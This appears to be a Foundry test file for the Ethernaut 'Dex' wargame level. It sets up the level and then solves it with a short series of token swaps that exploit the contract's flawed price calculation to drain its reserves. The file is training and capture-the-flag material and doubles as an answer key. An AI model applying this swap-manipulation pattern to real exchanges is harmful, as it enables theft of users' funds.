// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {Dex, SwappableToken} from "src/levels/Dex.sol";
import {DexFactory} from "src/levels/DexFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestDex is Test, Utils {
    Ethernaut ethernaut;
    Dex instance;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        DexFactory factory = new DexFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = Dex(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        vm.startPrank(player);

        SwappableToken token1 = SwappableToken(instance.token1());
        SwappableToken token2 = SwappableToken(instance.token2());

        token1.approve(address(instance), 200);
        token2.approve(address(instance), 200);
        instance.swap(address(token1), address(token2), 10);

        instance.swap(address(token2), address(token1), 20);
        instance.swap(address(token1), address(token2), 24);
        instance.swap(address(token2), address(token1), 30);
        instance.swap(address(token1), address(token2), 41);
        instance.swap(address(token2), address(token1), 45);

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
}
